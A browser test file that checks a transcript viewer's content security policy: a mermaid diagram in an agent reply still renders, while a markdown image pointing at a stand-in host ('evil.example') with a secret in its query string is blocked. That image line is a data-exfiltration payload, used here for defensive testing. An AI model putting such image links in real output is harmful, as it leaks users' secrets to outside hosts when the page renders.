import { afterAll, describe, expect, test } from "bun:test";
import { writeFileSync } from "node:fs";
import { Extension } from "../server-harness";
import { Transcript } from "../fixtures";
import { CHROMIUM, closeBrowser, openApp, startSandbox, until, type App } from "./helpers";

describe.skipIf(!CHROMIUM)("content security policy", () => {
  afterAll(closeBrowser);

  test("mermaid still draws, and a remote image in agent markdown is blocked", async () => {
    const s = await startSandbox((s) => {
      const t = s.transcript = new Transcript(s.session, `${s.home}/alpha`);
      t.user("Draw it", 1000);
      s.leaf = t.say("```mermaid\ngraph TD\n  A[Start] --> B[End]\n```\n\n![leak](https://evil.example/p.png?k=SECRET)", 2000);
      writeFileSync(s.transcriptPath, t.text());
    });
    let app: App | undefined;
    try {
      await new Extension(s).connect();
      app = await openApp(s, undefined, "#/b/1");
      const violations: string[] = [];
      app.page.on("console", (m) => /Content Security Policy/.test(m.text()) && violations.push(m.text()));
      await app.page.reload();
      await until(() => app!.page.locator(".assistant svg text, .assistant svg foreignObject").count().then((n) => n > 0), "drawn mermaid diagram");
      expect(await app.page.locator(".assistant .mermaid-src").count()).toBe(0);
      // The only refusal is the remote image: mermaid needs nothing the policy forbids.
      await until(async () => violations.length > 0, "remote image blocked");
      expect(violations).toHaveLength(1);
      expect(violations[0]).toContain("https://evil.example/p.png?k=SECRET");
      expect(violations[0]).toContain("img-src");
      expect(app.errors).toEqual([]);
    } finally {
      await app?.context.close();
      await s.close();
    }
  }, 20_000);
});
